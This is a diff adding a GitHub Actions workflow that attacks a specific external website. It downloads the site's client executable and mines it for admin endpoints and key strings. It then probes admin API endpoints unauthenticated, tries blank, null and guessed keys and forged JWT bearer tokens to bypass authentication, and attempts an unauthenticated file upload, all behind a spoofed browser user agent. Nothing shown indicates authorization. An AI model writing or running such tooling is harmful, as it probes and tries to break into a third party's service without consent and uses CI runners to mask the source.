@@ -1,0 +1,68 @@
+name: duck-svc-deep
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'base url'
+        required: false
+        default: 'https://yazinb.icu'
+permissions:
+  contents: write
+jobs:
+  deep:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Pull client exe + extract API strings
+        run: |
+          set -e
+          BASE="${{ github.event.inputs.target }}"
+          UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
+          mkdir -p out
+          echo "===== download client exe ====="
+          curl -sk -A "$UA" -o out/duck.exe "$BASE/dl/duck-toolbox-1.1.3.exe"
+          echo "exe bytes: $(wc -c < out/duck.exe)"
+          file out/duck.exe || true
+          echo "===== /svc/ paths found in binary ====="
+          strings -n 5 out/duck.exe | grep -oiE "/svc/[a-zA-Z0-9_./-]+" | sort -u | tee out/svc_paths.txt || true
+          echo "===== context around 'admin' / 'key' / 'Bearer' (key transmission) ====="
+          strings -n 4 out/duck.exe | grep -iE "admin|Bearer|Authorization|token|key|password|/svc/|^https?://" | head -80 | tee out/keyctx.txt || true
+          echo "===== DONE strings ====="
+      - name: Robust /svc/ endpoint + auth-bypass probe (no set -e)
+        run: |
+          BASE="${{ github.event.inputs.target }}"
+          UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
+          probe() {
+            local ep="$1"; local method="$2"; local data="$3"; local hdr="$4"
+            local url="$BASE$ep"
+            local body out code
+            out=$(curl -sk -A "$UA" -X "$method" -H "Content-Type: application/json" $hdr --data "$data" --max-time 25 -w "\n__CODE__%{http_code}__LEN__%{size_download}" "$url" 2>/dev/null)
+            code=$(echo "$out" | grep -oE "__CODE__[0-9]+__LEN__[0-9]+" | head -1)
+            body=$(echo "$out" | sed '/__CODE__[0-9]*__LEN__[0-9]*/d')
+            echo "[$method $ep] $code"
+            echo "  body: ${body:0:200}"
+          }
+          # Known endpoints from prior app.js analysis
+          EPS="/svc/admin/key /svc/admin/guide /svc/admin/guides /svc/admin/sysinfo /svc/admin/stats /svc/admin/trend /svc/admin/logs /svc/admin/users /svc/admin/user /svc/admin/bulk /svc/admin/sessions /svc/admin/session /svc/admin/flashes /svc/me /svc/logout /svc/key /svc/status /svc/health /svc/version /svc/info /svc/config /svc/guide /svc/guides /svc/license /svc/check /svc/ping /svc/upload /svc/file /svc/files"
+          echo "===== UNAUTH GET each endpoint ====="
+          for ep in $EPS; do probe "$ep" GET '{}' ''; done | tee out/probe_get.txt
+          echo "===== /svc/admin/key key-bypass variants (POST) ====="
+          probe "/svc/admin/key" POST '{}' ''                                            # empty
+          probe "/svc/admin/key" POST '{"key":""}' ''                                    # blank key
+          probe "/svc/admin/key" POST '{"key":null}' ''                                  # null key
+          probe "/svc/admin/key" POST '{"key":"admin"}' ''                               # guess
+          probe "/svc/admin/key" POST '{"key":"123456"}' ''                              # guess
+          probe "/svc/admin/key" POST '{}' '-H "X-Admin-Key: " -H "Authorization: Bearer "'   # blank headers
+          echo "===== /svc/admin/guide upload-format probe (POST, no key) ====="
+          probe "/svc/admin/guide" POST '{"name":"x","brand":"y"}' ''                    # json
+          curl -sk -A "$UA" -X POST -F "name=x" -F "brand=y" -F "file=@/etc/hostname" "$BASE/svc/admin/guide" -w "\n__CODE__%{http_code}__LEN__%{size_download}" | head -c 400
+          echo ""
+          echo "===== /svc/me etc with a fake bearer ====="
+          probe "/svc/me" GET '{}' '-H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.fake"'
+          probe "/svc/admin/sysinfo" GET '{}' '-H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.fake"'
+          echo "===== DONE probe ====="
+      - name: Upload capture
+        uses: actions/upload-artifact@v4
+        with:
+          name: duck-svc-deep
+          path: out/
+          if-no-files-found: warn
